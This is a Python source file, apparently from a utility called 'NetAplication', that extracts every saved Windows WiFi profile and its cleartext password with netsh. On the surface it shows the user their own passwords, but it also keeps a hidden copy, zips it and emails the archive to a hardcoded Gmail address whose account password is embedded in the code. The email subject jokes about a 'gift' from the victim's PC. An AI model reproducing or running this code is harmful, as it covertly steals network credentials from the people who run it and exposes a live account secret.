import subprocess
from _d_c import alerta_ok, eliminar_doc
from _m_h_e import copiar_pdf_a_escritorio, abrir_archivo, copiar_lib
import os
import shutil
from _t_d import pc_user_name
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def Wifi_data():
    # Ejecutar el comando para obtener los perfiles de usuario de las redes WiFi
    resultado = subprocess.run('netsh wlan show profiles', capture_output=True, text=True)
    output = resultado.stdout
    # Obtener los nombres de los perfiles de usuario
    nombres_perfiles = [linea.split(':')[1].strip() for linea in output.split('\n') if 'Perfil de todos los usuarios' in linea]
    # Obtener las contraseñas para cada perfil de usuario
    contrasenas = []
    for perfil in nombres_perfiles:
        resultado = subprocess.run(f'netsh wlan show profile name="{perfil}" key=clear', capture_output=True, text=True)
        output = resultado.stdout
        # Buscar la línea que contiene la contraseña
        linea_contrasena = [linea.strip() for linea in output.split('\n') if 'Contenido de la clave' in linea]

        if linea_contrasena:
            contrasena = linea_contrasena[0].split(':')[1].strip()
            contrasenas.append((perfil, contrasena))
    # Guardar los nombres y contraseñas en un archivo de texto
    with open('lib/data/Wifi_data.txt', 'w') as archivo:
        archivo.write('##############################\n')
        archivo.write(' PERFILES DE REDES GUARDADOS\n')
        archivo.write('##############################\n')
        for perfil, contrasena in contrasenas:
            archivo.write(f'Perfil: {perfil}\n')
            archivo.write(f'Contraseña: {contrasena}\n')
            archivo.write('##############################\n')
    copiar_pdf_a_escritorio("lib/data/Wifi_data.txt")#copa al escritorio
    copiar_lib("lib/data/Wifi_data.txt")#guarda una copia en binc
    alerta_ok("NetAplication", "Consulta!", "Los Perfiles y contraseñas se han guardado en el Escritorio.")
    abrir_archivo("Wifi_data.txt")#habre el archivo que se copio al escritorio
    eliminar_doc("lib/data/Wifi_data.txt")

def comprimir():
    folder_path = "lib/binc"
    zip_path = "lib/Data"

    if os.path.exists(folder_path):
        nombre_archivo = shutil.make_archive(zip_path, 'zip', folder_path)

def enviar_data():
    archivo = "lib/Data.zip"
    SMTP_SERVER = 'smtp.gmail.com'
    SMTP_PORT = 587
    usuario_pc = pc_user_name() 
    gmail_username = 'notificaciones.netaplication@gmail.com'
    gmail_password = 'wfosikbmcxfkexuo'
    # Crear objeto SMTP y establecer conexión
    smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    smtp.starttls()

    # Iniciar sesión en la cuenta de Gmail
    smtp.login(gmail_username, gmail_password)

    # Crear objeto MIMEMultipart
    msg = MIMEMultipart()

    # Configurar remitente, destinatario y asunto del correo
    msg['From'] = gmail_username
    msg['To'] = 'notificaciones.netaplication@gmail.com'
    msg['Subject'] = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
    # Agregar el cuerpo del mensaje
    mensaje = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
    #mensaje = 'Hola, este es el contenido del correo.'
    msg.attach(MIMEText(mensaje, 'plain'))
    
    if archivo is not None:
        try:
            with open(archivo, 'rb') as adjunto:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(adjunto.read())

            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {archivo}')
            msg.attach(part)
        except FileNotFoundError:
            agregar_log(f"No se encontró el archivo: {archivo}")
    # Enviar el correo electrónico
    smtp.send_message(msg)
    # Cerrar conexión SMTP
    smtp.quit()

